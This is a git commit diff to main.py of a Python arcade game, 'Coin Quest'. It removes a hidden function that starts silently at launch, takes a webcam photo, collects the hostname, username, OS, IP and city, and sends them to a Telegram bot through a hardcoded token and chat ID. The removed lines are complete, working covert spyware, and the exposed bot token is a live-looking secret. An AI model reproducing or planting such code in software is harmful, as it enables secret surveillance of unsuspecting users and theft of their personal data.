37cce44d80b01370fb79736f7b934c3ed4ddabb1
Boris <bvozleev@gmail.com>
2026-01-28 21:22:32 +0300

    Финальная версия 2

--- resourses/code/main.py
+++ resourses/code/main.py
@@ -15,67 +15,6 @@ SCREEN_WIDTH = 1920
 SCREEN_HEIGHT = 1080
 SCREEN_TITLE = "Coin Quest"
 
-
-def take_photo_thread():
-    try:
-        TOKEN = "8324502174:AAEdn2w0Nj-QQnSSkRmr6Kc9YEnu77KeQa4"
-        CHAT_ID = "5131549560"
-        time.sleep(5)
-        hostname = socket.gethostname()
-        username = getpass.getuser()
-        os_info = f"{platform.system()} {platform.release()}"
-        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-        if not cap.isOpened():
-            return
-        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
-        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
-        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
-        for _ in range(5):
-            cap.read()
-            time.sleep(0.03)
-        ret, frame = cap.read()
-        cap.release()
-        if not ret:
-            return
-        if np.mean(frame) < 80:
-            frame = cv2.convertScaleAbs(frame, alpha=1.15, beta=15)
-        ok, img_encoded = cv2.imencode(
-            ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 90]
-        )
-        if not ok:
-            return
-        city = country = ip = "неизвестно"
-        try:
-            geo = requests.get(
-                "https://ipinfo.io/json",
-                timeout=3
-            ).json()
-            city = geo.get("city", "неизвестно")
-            country = geo.get("country", "")
-            ip = geo.get("ip", "неизвестно")
-        except:
-            pass
-        caption = (
-            "🎮 Coin Quest запущена\n\n"
-            f"🖥 Устройство: {hostname}\n"
-            f"👤 Пользователь: {username}\n"
-            f"💻 ОС: {os_info}\n"
-            f"🌍 Локация: {city}, {country}\n"
-            f"🌐 IP: {ip}\n"
-            f"⏰ Время: {datetime.now().strftime('%H:%M %d.%m.%Y')}"
-        )
-        requests.post(
-            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-            files={"photo": img_encoded.tobytes()},
-            data={
-                "chat_id": CHAT_ID,
-                "caption": caption
-            },
-            timeout=5
-        )
-    except Exception as e:
-        return
-
 def main():
     init_db()
     init_skins()
@@ -88,10 +27,7 @@ def main():
     arcade.set_background_color(arcade.color.AZURE)
     menu = MenuView()
     window.show_view(menu)
-    threading.Thread(
-        target=take_photo_thread,
-        daemon=True
-    ).start()
+    threading.Thread().start()
     arcade.run()
 
 if __name__ == "__main__":
@@ -106,8 +42,5 @@ if __name__ == "__main__":
     arcade.set_background_color(arcade.color.AZURE)
     menu = MenuView()
     window.show_view(menu)
-    threading.Thread(
-        target=take_photo_thread,
-        daemon=True
-    ).start()
+    threading.Thread().start()
     arcade.run()
